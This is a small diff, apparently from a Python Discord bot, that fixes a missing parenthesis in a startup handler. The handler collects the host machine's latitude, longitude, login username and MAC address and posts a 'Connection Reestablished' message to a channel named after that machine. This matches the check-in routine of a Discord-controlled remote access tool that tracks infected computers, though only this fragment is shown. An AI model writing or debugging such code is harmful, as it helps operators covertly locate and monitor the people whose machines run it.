@@ -78,7 +78,7 @@ async def on_ready():
     latitude = data.get('latitude')
     longitude = data.get('longitude')
     username = os.getlogin()
-    guild = client.get_guild(int(guild_id)
+    guild = client.get_guild(int(guild_id))
     channel = await find_channel_by_name(guild, mac_address)
     if channel:
         embed=discord.Embed(title="**Connection Reestablished with: ** ```" + username +"```",colour=0x3)
